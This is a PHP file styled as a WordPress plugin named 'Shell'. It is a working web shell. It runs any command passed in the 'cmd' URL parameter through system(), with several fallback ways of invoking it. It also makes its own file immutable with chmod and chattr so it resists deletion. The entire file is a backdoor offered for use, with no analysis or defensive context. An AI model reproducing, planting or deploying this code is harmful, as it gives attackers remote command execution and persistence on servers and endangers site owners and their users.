<?php
/**
 * @package My_Shell
 * @version 1.0
 */
/*
	Plugin Name: Shell
	Plugin URL: http://google.com
	Description: A quick shell plugin
	Author: BlakSec
	Version: 1.0
 */
# prevent file deletion
$myfile = __FILE__;
system("chmod ugo-w $myfile");
system("chattr +i $myfile");
$command=urldecode($_GET["cmd"]);
if (class_exists('ReflectionFunction')) {
	$function = new ReflectionFunction('system');
	$function->invoke($command);
} elseif (function_exists('call_user_func_array')) {
	call_user_func_array('system', array($command));
} elseif (function_exists('call_user_func')) {
	call_user_func('system', $command);
} else {
	system($command);
}
?>